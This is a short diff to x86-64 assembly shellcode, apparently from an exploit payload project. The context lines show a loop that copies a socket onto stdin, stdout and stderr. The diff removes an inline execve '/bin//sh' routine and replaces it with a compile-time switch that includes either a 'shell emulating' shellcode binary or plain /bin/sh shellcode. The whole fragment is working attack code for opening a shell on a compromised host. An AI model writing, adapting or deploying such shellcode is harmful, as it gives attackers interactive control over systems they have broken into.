@@ -59,18 +59,12 @@ copy_stdin_out_err:
 	jns copy_stdin_out_err
 	
 	;; Any local shellcode here
-	;; 64bit execve /bin/sh below
-	;; it's usually what you want
-	xor  rax, rax
-        push rax
-        mov  rdi, 0x68732f2f6e69622f ;/bin//sh
-        push rdi
-        mov  al,  execve
-        mov  rdi, rsp
-        xor  rsi, rsi
-        xor  rdx, rdx
-	SYSTEM_CALL
-
-
-
 	
+%define EMULATOR
+	%ifdef 	EMULATOR
+	;;  shell emulating shellcode
+	incbin "../64shellEmulator/shellcode"
+%else
+	;;  ordinary shellcode (/bin/sh)
+	incbin "../64BitLocalBinSh/shellcode"
+%endif
